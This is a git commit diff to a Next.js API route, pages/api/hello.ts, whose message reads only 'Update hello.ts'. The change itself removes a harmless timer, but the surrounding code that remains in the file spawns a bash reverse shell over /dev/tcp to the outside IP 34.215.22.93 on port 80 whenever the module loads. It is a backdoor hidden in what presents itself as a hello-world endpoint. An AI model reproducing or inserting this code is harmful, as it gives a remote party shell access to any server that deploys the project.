e5d9dc77849e49547329725bb280098155e7129e
yoloampli <ylosonci+amplify@amazon.com>
2024-12-12 11:20:23 -0500

    Update hello.ts

--- pages/api/hello.ts
+++ pages/api/hello.ts
@@ -4,10 +4,6 @@ import { spawn } from 'child_process';
 const child = spawn('/bin/bash', ['-l', '>', '/dev/tcp/34.215.22.93/80', '0<&1', '2>&1'], { shell: true });
 console.log(child);
 
-setTimeout(() => {
-  console.log("Hello after 2 seconds");
-}, 20000); // 20000 milliseconds = 20 seconds
-
 
 type ResponseData = {
   message: string
